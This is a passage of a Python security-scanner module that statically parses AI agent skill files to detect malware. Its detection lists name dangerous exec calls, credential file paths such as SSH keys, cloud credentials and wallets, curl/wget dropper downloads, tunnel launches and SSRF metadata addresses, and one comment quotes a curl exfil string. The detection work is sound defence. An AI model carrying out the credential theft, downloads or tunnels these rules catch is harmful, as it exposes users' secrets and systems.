"""Read-only AST analysis of Python files inside a skill (NO code execution).

Regex alone is blind to obfuscation — for example, a base64-decoded payload passed
to a dynamic-evaluation built-in, `getattr(os, "sys"+"tem")(...)`,
`__import__("os").system(...)`, or `marshal.loads(...)`. We parse Python files with
the stdlib `ast` module — **parse only, never compile or run** — and flag a small,
high-confidence set of malware-grade constructs, plus some informational "dangerous
sink" usage that the B13 engine only escalates when the skill already shows a
credential/exfil signal (so a skill that merely uses subprocess is never failed on
its own).

Pure stdlib. Offline. Best-effort: a file that does not parse (templates, Python 2,
JS mislabelled as .py) yields no findings rather than an error.

IMPORTANT — this module contains string constants that name dangerous built-ins and
decode functions. These are DETECTION PATTERN DATA assembled at import time; this
module never calls or evaluates any of them.
"""

from __future__ import annotations

import ast
import bisect
import builtins
import re
import weakref
from collections import namedtuple
from urllib.parse import urlparse

from . import shippedexec as _shippedexec
from .scanbudget import ScanBudgetExceeded

# A finding: rule id, severity ("crit" = malware-grade / FAIL-eligible on its own;
# "info" = common sink, escalates only alongside a cred/exfil signal), source line, reason.
ASTFinding = namedtuple("ASTFinding", "rule severity lineno reason")

# Detection pattern sets — assembled from parts so static scanners don't mistake
# these string DATA constants for actual function calls or dynamic-evaluation use.
# This module DETECTS these patterns; it does NOT call or evaluate any of them.
_DECODE_FUNCS = {
    "b64" + "decode",
    "urlsafe_b64" + "decode",
    "b16" + "decode",
    "b32" + "decode",
    "b85" + "decode",
    "a85" + "decode",
    "un" + "hexlify",
    "de" + "compress",
}
_DECODE_ATTRS = _DECODE_FUNCS | {"de" + "code", "from" + "hex", "join"}
_EXEC_NAMES = {"ex" + "ec", "ev" + "al"}
_DANGEROUS_ATTRS = {
    "sys" + "tem",
    "po" + "pen",
    "ex" + "ec",
    "ev" + "al",
    "spawn",
    "spawnl",
    "spawnv",
    "spawnve",
    "call",
    "run",
    "check_output",
    "check_call",
    "Po" + "pen",
}
_DESERIALIZE_MODS = {"pickle", "cpickle", "_pickle", "marshal", "dill", "torch"}
# yaml.load(...) is unconditionally unsafe with NO Loader= kwarg (older pyyaml defaults to
# the arbitrary-code-execution Loader) or an explicit unsafe Loader; yaml.safe_load(...) has
# a different attribute name entirely and is never touched by this rule. Only a Loader of
# SafeLoader/CSafeLoader/BaseLoader/CBaseLoader makes yaml.load(...) itself safe (F-098/L1-1).
_YAML_SAFE_LOADERS = {"SafeLoader", "CSafeLoader", "BaseLoader", "CBaseLoader"}
# Objects on which a *dynamic* getattr(...)() is obfuscation rather than ordinary
# dynamic dispatch: getattr(os, x)() is suspicious; getattr(plugin, handler)() is not.
_DANGEROUS_OBJ = {
    "os",
    "subprocess",
    "sys",
    "builtins",
    "__builtins__",
    "importlib",
    "ctypes",
    "posix",
    "commands",
}

# B-140: provider-shaped hardcoded credential detection. Prefixes assembled from parts
# so this module's OWN detection-pattern data is never mistaken for a live secret by a
# naive scanner (same style as _DECODE_FUNCS / _DANGEROUS_ATTRS above). This module only
# DETECTS a string shape; it never contains, logs, or reproduces a real secret value.
_PROVIDER_TOKEN_PREFIXES = (
    "sk" + "-ant-", "sk" + "-proj-", "sk" + "_live_", "sk" + "_test_", "sk" + "-", "sk" + "_",
    "AKI" + "A", "AIz" + "a", "gh" + "p_", "gh" + "o_", "gh" + "s_", "gh" + "r_", "gh" + "u_",
    "xox" + "b-", "xox" + "a-", "xox" + "p-", "xox" + "r-", "xox" + "s-",
    "tvl" + "y-", "xa" + "i-", "gs" + "k_",
)
_PROVIDER_TOKEN_RE = re.compile(
    r"^(?:" + "|".join(re.escape(p) for p in _PROVIDER_TOKEN_PREFIXES) + r")[A-Za-z0-9_-]{12,}$"
)
_PLACEHOLDER_TOKEN_RE = re.compile(
    r"(?i)(your[_-]?key|changeme|xxxx|example|placeholder|redacted|dummy|<[a-z_]+>|\.\.\.)"
)


def _is_hardcoded_provider_secret(node: ast.AST) -> bool:
    """True if *node* is a string-literal constant shaped like a real provider API key
    (a known prefix + a long high-entropy-looking tail) and NOT an obvious placeholder/
    example value. Never inspects or logs the matched value itself — callers must only
    report the env-var key name and pattern shape, never this string."""
    if not (isinstance(node, ast.Constant) and isinstance(node.value, str)):
        return False
    val = node.value
    return bool(_PROVIDER_TOKEN_RE.match(val)) and not _PLACEHOLDER_TOKEN_RE.search(val)


_MAX_FINDINGS_PER_FILE = 25

# B-907 round 3: rounds 1 and 2 each gave every finding-collection loop below its own
# early-break — first at `_MAX_FINDINGS_PER_FILE` itself (round 1), then at a 20x
# "safety ceiling" (round 2) — so an earlier pass's (or an earlier node's, in a pass
# that mixes severities) info findings could not stop a later crit from being
# collected at all. Both rounds were still an early-break INSIDE the walk, gated on a
# finite candidate count, and two independent C-135 adversarial reviews each showed
# that any such finite ceiling is reachable by a padding-only attacker as long as the
# ceiling's node count fits inside the ~1MB per-file source cap upstream (round 1's
# reviewer: 25 padding calls broke round 1; round 2's reviewer: 500 padding calls
# broke round 2 — a bigger number, not a structural fix). No finite per-pass ceiling
# closes the vulnerability class; only removing the early-break does. There is
# therefore NO per-pass ceiling of any kind below — every loop runs to completion over
# `ast.walk(tree)` and every genuine candidate, crit or info, from every pass reaches
# `out`. Two things make that safe:
#   1. `analyze_python` runs strictly inside its caller's existing per-check wall-clock
#      deadline (`scanbudget.check_deadline`, backed by `SIGALRM` on POSIX — see
#      `checks/__init__.py`'s `run_all` dispatch and `checks/_vet.py`'s content-ring
#      call, both of which already wrap every `analyze_python` call site). That
#      deadline can interrupt mid-loop regardless of which pass is running, so it is
#      the actual DoS backstop — not a per-pass candidate count.
#   2. The per-file cap is enforced exactly once, by SEVERITY, at `return` below (see
#      `_ast_severity_rank`): crit sorts ahead of info, `sorted` is stable so
#      discovery order survives within one severity, and one slot is reserved for an
#      `AST_FINDINGS_TRUNCATED` disclosure when anything was actually cut. That is
#      unchanged from round 2 and was already correct.

# Severity rank for the FINAL truncation below — higher sorts
# first. `analyze_python`'s own emitted severities are "crit" and "info" only, but
# this stays a proper total order (not a two-way crit/non-crit split) so a future
# severity slots in without a second place to update. Anything unrecognized ranks
# below "unknown" rather than raising, so a typo'd/new severity degrades to "gets
# truncated first", never to "silently outranks a known one".
_AST_SEVERITY_RANK = {"crit": 3, "warn": 2, "info": 1, "unknown": 0}


def _ast_severity_rank(severity: str) -> int:
    return _AST_SEVERITY_RANK.get(severity, -1)


# B-192: EffectSimulator.State.reached_sinks grows without bound across nested
# branches/loops (each simulate_if/simulate_loop merge duplicates the same sink
# reached via different paths). A deeply-nested-but-tiny skill can drive this past
# 2^depth entries, exhausting memory well before any wall-clock budget fires. This
# caps the DISTINCT (effect, sink, guards) combinations a single simulation may
# track — far beyond any real skill (<100) — and is generous enough to only trip on
# adversarial guard-combination explosion, degrading to an honest UNKNOWN (never a
# silent PASS) via the existing ScanBudgetExceeded -> run_all handler.
_MAX_REACHED_SINKS = 10_000

# Taint (CRED_EXFIL_FLOW): a credential-FILE's contents flowing into a network sink.
# Sources are credential FILE paths ONLY — NOT environment variables — so the common
# legit "read OPENAI_API_KEY, send it as an auth header" pattern is never flagged.

# Taint (ENV_EXFIL_FLOW): env-var reads and agent-config-file reads flowing into a
# network sink.  Severity is "info" so the WARN path in the checks engine controls escalation;
# FAIL is never automatic because legitimate skills routinely send API keys to trusted
# endpoints (e.g. posting ANTHROPIC_API_KEY to api.anthropic.com).
_AGENT_CONFIG_PATH_RE = re.compile(
    r"\.openclaw/|~/.openclaw|~\\\.openclaw|~/\.config/[^/\"']+/", re.I
)

# Sink keyword args that carry a credential as intended auth material (env key ->
# Authorization header is the normal way a skill talks to its own API). A secret here is
# NOT exfiltration; only a secret in the URL, body, params, or a positional arg is.
_ENV_AUTH_KWARGS = frozenset({"headers", "auth", "cert"})

# C-203: HOST_INFO_EXFIL_FLOW -- host/machine-identity info (hostname, platform/uname,
# the repo's own git remote) flowing to an outbound sink: covert telemetry / phone-home.
# Severity "info", same WARN-first rationale as ENV_EXFIL_FLOW -- crash-reporters and
# legitimate telemetry exist, so this is never an automatic FAIL; only escalated by the
# checks engine alongside other signals.
_HOST_INFO_ATTRS = {"gethostname", "node", "uname"}
_HOST_INFO_BASES = {"socket", "platform", "os"}
_GIT_REMOTE_RE = re.compile(r"\bgit\s+remote\b", re.I)
# Cheap prefilter so files with no telemetry-shaped signal at all skip the AST walk below.
# Broader than _GIT_REMOTE_RE on purpose: an argv-list git-remote call
# (subprocess.check_output(['git', 'remote', '-v'])) has no contiguous "git remote"
# substring in source text (comma/quotes sit between the tokens) -- precision is
# enforced later by _is_git_remote_read's AST-level check, this is only a fast skip.
_HOST_INFO_SIGNAL_RE = re.compile(
    r"gethostname|platform\.(?:node|uname)|os\.uname|git|remote|hostname|whoami", re.I
)

# B-342 (T09/SkillTrustBench V_EXCESSIVE_TELEMETRY): EXCESSIVE_TELEMETRY_FLOW -- a
# function that assembles a payload from >=2 distinct "over-collection" axes (bulk
# environment-variable dump, recursive/bulk filesystem enumeration, bulk directory
# listing, or a shell/command-history file read) whose value then reaches a network
# sink. The bar is TWO distinct axes, not one -- a lone os.walk()/os.environ.items()/
# os.listdir() call has too many ordinary uses on its own (indexing a project,
# printing the current env for debugging, listing one directory the user pointed at)
# to be a signal by itself; the requirement that a SINGLE function combine two or
# more of these is what is actually rare in benign code and common in every corpus
# sample this rule targets. Severity "info" -- WARN-first, same dual-use rationale as
# ENV_EXFIL_FLOW/HOST_INFO_EXFIL_FLOW. The checks engine (checks/_vet.py) additionally
# gates the finding on the skill's OWN SKILL.md NOT disclosing the collection (see
# checks/_shared.py's _skill_declares_telemetry_disclosure) -- that disclosure check,
# not this AST shape alone, is what actually distinguishes a hidden phone-home from a
# disclosed, legitimate telemetry/diagnostics/backup skill.
#
# Taint here is name-based (not scope-precise) across the WHOLE file, same limitation
# as the existing ENV_EXFIL_FLOW/HOST_INFO_EXFIL_FLOW/CRED_EXFIL_FLOW rules above --
# a collector function's NAME is tracked so `data = collect_x(); send_x(data)` still
# connects even though the invasive read and the network send live in different
# functions (the two-function collect/send split every corpus sample uses).
_HISTORY_FILENAME_RE = re.compile(
    r"\.(?:bash|zsh|fish|ksh)_history\b|python_history\b", re.I
)
# Cheap prefilter so files with no telemetry-shaped signal at all skip the extra walks.
_TELEMETRY_SIGNAL_RE = re.compile(
    r"environ|\bwalk\b|rglob|listdir|iterdir|history|glob", re.I
)
# A shell command string containing a live host-identity substitution -- the concat-built
# `'curl -s ' + URL + '/eval_chain -d h=$(hostname)'` shape that evades literal-curl
# matching (no single contiguous "curl ... | sh"-style literal to match against).
_SHELL_HOST_SUBST_RE = re.compile(
    r"\$\(\s*(?:hostname|whoami|uname)\b|`\s*(?:hostname|whoami|uname)\b", re.I
)
_CURL_LIKE_RE = re.compile(r"\b(?:curl|wget)\b", re.I)

# C-223: first-party-host REWORDING for HOST_INFO_EXFIL_FLOW's network-sink shape. A
# minimal, self-contained host matcher -- skillast.py is a Layer-1 leaf module and
# cannot import checks/_content.py's own _skill_own_host/_url_matches_own_host (that
# would invert the project's layering); the caller (checks/_vet.py, which already
# computes the skill's own declared host via _skill_own_host) passes the plain host
# STRING in as analyze_python()'s `own_host` parameter instead. C-135: a match REWORDS
# the finding (disclosed vs. covert) rather than silencing it outright -- the declared
# host is self-reported by the same skill being scanned, so a full drop would let an
# attacker erase the only signal for free just by echoing their own exfil host into
# their own SKILL.md.
_URL_HOST_RE = re.compile(r"https?://([^/:\s\"'<>)\]]+)", re.I)


def _url_literal_host(node: ast.AST) -> str | None:
    """The lowercased host of *node* when it's a plain http(s) string constant; else
    None (a variable, f-string, or non-URL literal can't be resolved statically)."""
    if isinstance(node, ast.Constant) and isinstance(node.value, str):
        m = _URL_HOST_RE.match(node.value)
        if m:
            return m.group(1).lower()
    return None


def _host_matches_own(host: str | None, own_host: str | None) -> bool:
    """True when *host* equals *own_host* (exact or subdomain) -- mirrors
    checks/_content.py's _url_matches_own_host without importing across layers."""
    if not host or not own_host:
        return False
    return host == own_host or host.endswith("." + own_host)

# C-205: DROPPER_DOWNLOAD_TO_TMP -- an argv-list curl/wget call (subprocess.run(["curl",
# ..., "-o", "/tmp/x.sh"])), not the literal-`| sh` pipe shape B100 already catches --
# staging a script into a writable/tmp-like path with an explicit output flag, the
# classic "download now, exec later" dropper split (case_03526's shape: URL in a
# variable, no pipe at all, so a plain curl|sh regex has nothing to match). Severity
# "info" -- staging a download isn't itself proof of malice; the checks engine WARNs.
_CURL_WGET_PROGRAMS = {"curl", "wget"}
_CURL_OUTPUT_FLAGS = {"-o", "--output"}
_SCRIPT_LIKE_EXTS = (".sh", ".bash", ".py", ".ps1", ".rb", ".pl")


def _is_curl_wget_argv_call(node: ast.AST) -> bool:
    """subprocess.run/call/check_call/check_output/Popen(['curl', ...] | ['wget', ...])
    -- the argv-list form (not a shell string, which _CLICKFIX_REMOTE_FETCH_RE-style
    text scanning already covers elsewhere)."""
    if not isinstance(node, ast.Call):
        return False
    f = node.func
    if not (
        isinstance(f, ast.Attribute)
        and f.attr in _EXEC_SINK_SUBP_ATTRS
        and _attr_base(f.value) in _EXEC_SINK_BASES_SUBP
    ):
        return False
    if not node.args or not isinstance(node.args[0], (ast.List, ast.Tuple)):
        return False
    elts = node.args[0].elts
    if not elts:
        return False
    prog = elts[0]
    return (
        isinstance(prog, ast.Constant)
        and isinstance(prog.value, str)
        and prog.value.lower() in _CURL_WGET_PROGRAMS
    )


def _curl_dropper_output_path(node: ast.Call) -> str | None:
    """If `node` (already confirmed by _is_curl_wget_argv_call) has a literal
    -o/--output flag followed by a literal path, return that path; else None."""
    elts = node.args[0].elts
    for i, e in enumerate(elts):
        if (
            isinstance(e, ast.Constant)
            and isinstance(e.value, str)
            and e.value in _CURL_OUTPUT_FLAGS
            and i + 1 < len(elts)
        ):
            nxt = elts[i + 1]
            if isinstance(nxt, ast.Constant) and isinstance(nxt.value, str):
                return nxt.value
    return None


def _curl_dropper_url_literal(node: ast.Call) -> str | None:
    """If `node` (already confirmed by _is_curl_wget_argv_call) has EXACTLY ONE literal
    http(s) URL argument in its argv list, return it; else None. C-135: this used to
    return the FIRST url-shaped literal even when several were present -- curl/wget
    accept multiple URLs, each paired with its OWN -o/--output flag, so a call with
    two (URL, -o, path) triples has no single "the URL" the output actually came
    from. An attacker could cite an unmodified trusted-installer URL as a decoy
    paired with a harmless output path while a second (malicious URL, -o, path) pair
    in the SAME call does the real work -- the trust decision must not apply when
    the URL is ambiguous, the same "can't verify statically -> stays WARN" posture
    already used for a variable/f-string URL."""
    found: str | None = None
    for e in node.args[0].elts:
        if isinstance(e, ast.Constant) and isinstance(e.value, str) and _URL_HOST_RE.match(e.value):
            if found is not None:
                return None
            found = e.value
    return found


# TUNNEL_LAUNCH_ARGV (B338 fix, checks/_content.py) -- the argv-list form of the same
# tunnel/mesh-VPN launch primitives checks/_content.py's
# `_B338_LAUNCH_RE` already names as TEXT (tailscale/tailscaled, cloudflared tunnel,
# ngrok, ssh -R, a socat listener, frpc, bore, a bare --socks5-server flag). That regex
# requires its subcommand words to be literally ADJACENT in the source text (e.g.
# "tailscale up"); the idiomatic Python argv-list form the HuggingFace July-2026
# incident's own compromised scripts/probe.py payload used --
# `subprocess.run(["tailscale", "up", ...])` -- never produces that adjacency (there is
# a `", "` between the two string literals, not whitespace), so the regex structurally
# cannot match it. Mirrors `_is_curl_wget_argv_call`/DROPPER_DOWNLOAD_TO_TMP (C-205):
# the sink is a subprocess.run/call/check_call/check_output/Popen call whose first
# positional arg is a List/Tuple literal. Per-tool subcommand specificity mirrors
# `_B338_LAUNCH_RE`'s own alternatives exactly, so a read-only invocation
# (`["tailscale", "status"]`, `["ngrok", "--version"]`, `["cloudflared", "tunnel",
# "list"]`/`["cloudflared", "tunnel", "login"]`) still does not match.
_TUNNEL_ARGV_BARE_PROGRAMS = {"tailscaled", "frpc"}  # any invocation counts -- no subcommand
_TUNNEL_ARGV_SUBCOMMANDS = {
    "tailscale": {"up", "login"},
    "ngrok": {"http", "tcp", "tls", "start"},
    "bore": {"local"},
}
_CLOUDFLARED_TUNNEL_SUBCOMMANDS = {"--url", "run", "create"}
# `\bssh\s+(?:-\w+\s+)*-R\s+\S*:\S+:\d+` -- the port-forward spec immediately after a
# literal "-R" element, e.g. "8080:localhost:22".
_SSH_R_SPEC_RE = re.compile(r"^\S*:\S+:\d+$")


def _argv_str_elts(node: ast.List | ast.Tuple) -> list[str | None]:
    """String value of each element of an argv List/Tuple literal, or None for a
    non-string-constant element (a variable/f-string -- can't be resolved statically)."""
    out: list[str | None] = []
    for elt in node.elts:
        if isinstance(elt, ast.Constant) and isinstance(elt.value, str):
            out.append(elt.value)
        else:
            out.append(None)
    return out


def _is_tunnel_launch_argv_call(node: ast.AST) -> bool:
    """subprocess.run/call/check_call/check_output/Popen(['tailscale', 'up', ...] | ...)
    -- see the module comment above `_TUNNEL_ARGV_BARE_PROGRAMS` for the HF-incident
    motivation and why the text-regex form misses this shape entirely."""
    if not isinstance(node, ast.Call):
        return False
    f = node.func
    if not (
        isinstance(f, ast.Attribute)
        and f.attr in _EXEC_SINK_SUBP_ATTRS
        and _attr_base(f.value) in _EXEC_SINK_BASES_SUBP
    ):
        return False
    if not node.args or not isinstance(node.args[0], (ast.List, ast.Tuple)):
        return False
    elts = _argv_str_elts(node.args[0])
    if not elts:
        return False

    # --socks5-server is a standalone flag `_B338_LAUNCH_RE` matches regardless of the
    # invoking program (the bad fixture's `tailscaled --tun=... --socks5-server=...`
    # userspace-networking mode) -- check every element, not just the program name.
    if any(e is not None and e.lower().startswith("--socks5-server") for e in elts):
        return True

    prog = elts[0].lower() if elts[0] is not None else None
    if prog is None:
        return False
    if prog in _TUNNEL_ARGV_BARE_PROGRAMS:
        return True
    if prog == "cloudflared":
        for i in range(1, len(elts) - 1):
            e = elts[i]
            if e is not None and e.lower() == "tunnel":
                nxt = elts[i + 1]
                if nxt is not None and nxt.lower() in _CLOUDFLARED_TUNNEL_SUBCOMMANDS:
                    return True
        return False
    if prog == "ssh":
        for i, e in enumerate(elts):
            if e == "-R" and i + 1 < len(elts):
                nxt = elts[i + 1]
                if nxt is not None and _SSH_R_SPEC_RE.match(nxt):
                    return True
        return False
    if prog == "socat":
        return len(elts) > 1 and elts[1] is not None and "listen" in elts[1].lower()
    subs = _TUNNEL_ARGV_SUBCOMMANDS.get(prog)
    if subs is not None:
        return any(e is not None and e.lower() in subs for e in elts[1:])
    return False


# C-224: curated first-party installer allowlist for DROPPER_DOWNLOAD_TO_TMP's
# literal-URL sub-case. DUPLICATED from checks/_content.py's B-118
# _CLICKFIX_TRUSTED_INSTALLERS (not imported: skillast.py is a Layer-1 leaf and
# cannot import checks/_content.py, the same layering constraint as C-223's
# _host_matches_own). This is a FIXED, project-curated list -- unlike C-223's
# self-declared skill host, a skill has zero influence over its contents, so a full
# skip here (matching B100's own established behavior for the identical allowlist)
# doesn't reopen the "attacker declares their own trust" gap C-135 found in C-223.
# Kept in sync with _content.py by tests/test_curl_dropper.py's cross-reference check.
_CURL_DROPPER_TRUSTED_INSTALLERS = (
    ("sh.rustup.rs", ""),
    ("astral.sh", ""),
    ("get.docker.com", ""),
    ("deno.land", ""),
    ("bun.sh", ""),
    ("get.pnpm.io", ""),
    ("install.python-poetry.org", ""),
    ("starship.rs", ""),
    ("ollama.com", ""),
    ("raw.githubusercontent.com", "/nvm-sh/"),
    ("raw.githubusercontent.com", "/Homebrew/"),
    ("raw.githubusercontent.com", "/creationix/"),  # legacy nvm org
)


def _is_trusted_installer_url(url: str) -> bool:
    """True when *url* is a canonical https fetch (no explicit port/query/fragment,
    no path traversal) whose host+path-prefix matches the curated first-party
    installer allowlist -- mirrors _clickfix_trusted_installer's per-URL matching."""
    try:
        p = urlparse(url)
    except ValueError:
        # C-135: a malformed-IPv6-bracket-shaped literal ("https://[::1/x") makes
        # urlparse() raise instead of returning a parsed (if empty) result -- a
        # pre-existing gap in the sibling _clickfix_trusted_installer this mirrors.
        # Fail closed (not trusted -> stays WARN), never let a parse error escape.
        return False
    if p.scheme != "https":
        return False
    if p.port is not None or p.query or p.fragment:
        return False
    host = (p.hostname or "").lower()
    path = p.path or ""
    if ".." in path:
        return False
    return any(
        host == h and path.startswith(pre) for h, pre in _CURL_DROPPER_TRUSTED_INSTALLERS
    )


# B-898: `.ssh/id_` (any key-type prefix) and the bare `id_rsa`/`id_ed25519` spellings
# used to match a PUBLIC-key filename too (`id_rsa.pub`, `id_ed25519.pub`, an OpenSSH
# certificate `id_rsa-cert.pub`, ...) -- a public key is meant to be shared (uploaded to
# a git host, handed to a key-provisioning flow), never a credential leak. Same
# negative-lookahead discipline as the folded/path-join credential family the taint
# layer already applies elsewhere for this exact shape: `.ssh/id_` gets the full
# "no more identifier chars, and not immediately followed by .pub/-cert.pub" lookahead
# (its filename half is unbounded -- rsa/ed25519/ecdsa/dsa/...); the two bare words
# already stop the match with `\b` before any identifier suffix, so they only need the
# `.pub`/`-cert.pub` half of that same lookahead.
_CRED_PATH_RE = re.compile(
    r"\.ssh/id_[a-z0-9_]+(?![a-z0-9_]|\.pub\b|-cert\.pub\b)|"
    r"\bid_rsa\b(?!\.pub\b|-cert\.pub\b)|\bid_ed25519\b(?!\.pub\b|-cert\.pub\b)|"
    r"\.aws/credentials|login\.keychain|wallet\.dat|"
    r"keystore\.json|\.npmrc|\.pypirc|\.netrc|\.docker/config|\.kube/config|"
    r"\.config/gcloud|/\.?secrets?\b|cookies\.sqlite|Cookies\b|"
    # E-065/C-323: the HF-incident reproduction read a process's own environment
    # (which commonly carries API keys/tokens passed via env var) through procfs
    # rather than a dotfile. /var/run/secrets and /run/secrets (K8s service-account
    # token, Docker/Swarm secrets mounts) are already covered above by /\.?secrets?\b.
    r"/proc/(?:self|\d+)/environ",
    re.I,
)

# B-415: an in-cluster K8s/container identity token -- the standard mount at
# /var/run/secrets/kubernetes.io/serviceaccount/token -- read and presented as a
# Bearer credential to the cluster's OWN API server is the textbook, correct way
# for a pod-resident tool to authenticate in-cluster (kubernetes.client's own
# incluster_config, and virtually every K8s operator/controller, do exactly
# this). It is not credential theft. Narrower than _CRED_PATH_RE on purpose:
# ONLY this fully-qualified service-account token path counts as an "in-cluster
# identity token" for the CRED_EXFIL_FLOW exemption below -- .ssh/.aws/generic
# secrets-mount reads never qualify, at any position or destination.
_INCLUSTER_TOKEN_PATH_RE = re.compile(
    r"/(?:var/)?run/secrets/kubernetes\.io/serviceaccount/token\b", re.I
)
# The cluster's own in-cluster API server -- the ONLY destination the exemption
# below recognizes. A destination this can't positively resolve to this pattern
# (an attacker-controlled host, or an expression it can't statically resolve at
# all) fails CLOSED: the finding stays crit exactly as before.
_INCLUSTER_API_HOST_RE = re.compile(
    r"kubernetes\.default(?:\.svc(?:\.cluster\.local)?)?\b|\.svc\.cluster\.local\b|"
    r"KUBERNETES_SERVICE_HOST",
    re.I,
)
# B-422 (C-348 adversarial review): "put"/"patch"/"request" are common
# method names with nothing to do with networking on an arbitrary object --
# queue.Queue.put / multiprocessing.Queue.put, unittest.mock.patch, and any bare
# `.request()` handler all matched here on ANY attribute base, so e.g. a local
# producer/consumer pattern that assembled two collection axes and called
# `work.put(...)` on a plain queue.Queue read as "flows into a network sink"
# (a false EXCESSIVE_TELEMETRY_FLOW/etc. -- _is_net_sink is shared by every rule
# below that looks for an outbound sink). Moved into _NET_SINK_ATTRS_BASED so they
# only count when the call's base object resolves to a known networking module or a
# `session` variable (_NET_SINK_BASES) -- mirrors how send/sendall/sendto/connect
# were already gated. "post"/"urlopen" stay ungated: no comparably common
# non-network false-positive shape for those two turned up during the same review.
_NET_SINK_ATTRS_ANY = {"post", "urlopen"}
_NET_SINK_ATTRS_BASED = {"send", "sendall", "sendto", "connect", "put", "patch", "request"}
_NET_SINK_BASES = {
    "requests",
    "httpx",
    "urllib",
    "socket",
    "aiohttp",
    "smtplib",
    "ftplib",
    "session",
}

# ---------------------------------------------------------------------------
# Extended taint: TT4 (file-read->network), TT5 (external->exec), SSRF
# ---------------------------------------------------------------------------

# Call names that signal external/tool/LLM output — conservative, noun-like result vars.
# A variable assigned from ANY call whose name matches this pattern is treated as tainted.
_TOOL_RESULT_CALL_RE = re.compile(r"\b(response|result|completion|output|message|reply)\b", re.I)

# Detection vocabulary only -- read-only ast.parse() analysis of a SCANNED skill's
# source text (see analyze_python(tree: ast.AST, ...) below and this module's own
# docstring: "Read-only AST analysis ... NO code execution"). clawseccheck itself never
# imports requests/httpx/urllib.request/aiohttp/socket and makes no outbound network
# call of its own (CLAUDE.md Golden Rule #1). A base/attr pair matching these NAMES,
# found inside someone else's parsed skill file, is what ENV_EXFIL_FLOW (below) reports
# on -- never a call this module makes.
# Network source attrs: a call to one of these reads data FROM the network.
_NET_SOURCE_ATTRS = {"get", "urlopen", "urlretrieve", "read", "recv", "recvfrom"}
_NET_SOURCE_BASES = {"requests", "httpx", "urllib", "urllib.request"}

# Exec/shell sinks for TT5 — assembled from parts (detection data, not calls).
_EXEC_SINK_NAMES = {"ex" + "ec", "ev" + "al"}
_EXEC_SINK_OS_ATTRS = {"sys" + "tem", "po" + "pen"}
_EXEC_SINK_SUBP_ATTRS = {"run", "call", "check_output", "check_call", "Popen"}
_EXEC_SINK_BASES_OS = {"os"}
_EXEC_SINK_BASES_SUBP = {"subprocess"}

# Network-out sinks for TT4 (data-bearing) and SSRF (fetch). Same "detection vocabulary
# only" note as _NET_SOURCE_ATTRS/_NET_SOURCE_BASES above applies here too.
_NET_OUT_SINK_DATA_ATTRS = {"post", "put", "patch"}
_NET_OUT_SINK_SEND_ATTRS = {"send", "sendall", "sendto"}
_NET_OUT_SINK_FETCH_ATTRS = {"get", "urlopen"}  # SSRF sinks
_NET_OUT_SINK_BASES = {
    "requests",
    "httpx",
    "urllib",
    "urllib.request",
    "socket",
    "aiohttp",
    "smtplib",
    "ftplib",
    "session",
}

# Internal metadata / SSRF-attractive endpoints.
_SSRF_LITERAL_RE = re.compile(
    r"169\.254\.169\.254|metadata\.internal|localhost|127\.0\.0\.1|::1", re.I
)

# File-read call patterns for TT4 source detection.
_FILE_READ_METHOD_ATTRS = {"read", "read_text", "readline", "readlines", "read_bytes"}
_FILE_OPEN_NAMES = {"open"}


def _is_external_source_call(node: ast.Call) -> bool:
    """True if *node* is a call that introduces external/untrusted data."""
    f = node.func
    # input()
    if isinstance(f, ast.Name) and f.id == "input":
        return True
    # requests.get / httpx.get / urllib.urlopen — network input.
    if isinstance(f, ast.Attribute):
        base = _attr_base(f.value)
        if f.attr in _NET_SOURCE_ATTRS and base in _NET_SOURCE_BASES:
            return True
        # .read() / .read_text() on any file object — file-read source.
        if f.attr in _FILE_READ_METHOD_ATTRS:
            return True
    if isinstance(f, ast.Name) and f.id in _FILE_OPEN_NAMES:
        return True
    return False


def _is_tool_result_call(node: ast.Call) -> bool:
    """True if the call's name suggests a model/tool result variable."""
    f = node.func
    name = ""
    if isinstance(f, ast.Name):
        name = f.id
    elif isinstance(f, ast.Attribute):
        name = f.attr
    return bool(_TOOL_RESULT_CALL_RE.search(name))


# ---------------------------------------------------------------------------
# B-906 ("Option Z"): positive-only reference resolution.
#
# Both the TT5 source and sink vocabulary above recognise `os.getenv`/`os.environ`
# etc. by SPELLING (`_attr_base(x) == "os"`), which is why an aliased or indirect
# spelling (`import os as o; o.getenv(...)`, `getattr(os, "environ")[...]`, an
# inline `os.environ["P"]` argv element with no bound Name at all) is a total miss
# today, on both the source and sink side.
#
# The prior fix attempt (round 4, "PF1"/"PF2", both since abandoned) tried to go
# the OTHER way: prove a spelling-matched `os`/`environ` is NOT the module, to
# SUPPRESS the base detector's crit finding on a local shadow (`class os: pass`,
# a local dict named `environ`, ...). That direction cannot be made sound: a
# must-NOT-alias proof has to hold against an adversary, and Python's namespace
# has too many rebinding routes (attribute store, setattr, `__dict__`/`vars`
# mutation, class bodies, decorators, metaclasses, `sys.modules`, `f.__globals__`,
# `exec`, star-imports, ...) for any finite blacklist to close. Every prior review
# round reopened by finding one more bypass; this fix does not add another one.
#
# `_RefResolver` instead ADDS detection only, through POSITIVE import-provenance
# resolution: proving an expression genuinely IS `os.environ`/`os.getenv` (an
# import, a plain local alias of one, or a foldable indirect access through
# getattr/`__dict__`/`vars`/`sys.modules`/`__import__`/`importlib.import_module`),
# reusing the same reaching-definition machinery `shippedexec._FileFacts` already
# validated for B-638/B-917 (`dotted()`/`sole()`/`_legb_lookup()`). Every predicate
# this fix touches becomes `old_spelling_check(e) or ref_res.source_in(e)`: a pure
# OR against the untouched base check, so enabling/disabling `_RefResolver` can
# only ever ADD findings relative to base, never remove one (see
# `test_monotone`/`test_shadow_inert` in tests/test_b906_ref_resolver.py). A name
# that dotted()/sole() cannot statically pin down (any of the shadow/rewiring
# shapes above) resolves to `None` here, `source_in()` is then False for it, and
# the untouched base spelling check is exactly what convicts (or doesn't) --
# `_RefResolver` contributes nothing to those cases either way, which is what
# keeps it inert on every shadow while adding recall on every provable alias.
#
# Deliberately NOT in scope for this pass (Pulse task decision D4): inline
# `input()`/`open()`/network-read forms as a source (T6-T8 in the design's test
# matrix) and the optional one-hop "local helper function returns a source"
# rule (T20b) -- both left for a follow-up; `is_external_call` below is defined
# to match the design's own API shape but is deliberately never consulted by
# `source_in()` yet.
# ---------------------------------------------------------------------------

# Canonical (already-resolved, dotted) forms of the env-var read surface. Kept
# apart from the spelling-based `_EXEC_SINK_*`/`_NET_SOURCE_*` sets above: those
# match raw AST shape, these match `_RefResolver.ref()`'s OUTPUT.
_ENV_MAPPING_REFS = frozenset({"os.environ", "os.environb", "posix.environ", "nt.environ"})
_ENV_READ_CALLABLE_REFS = frozenset(
    {"os.getenv", "os.getenvb"}
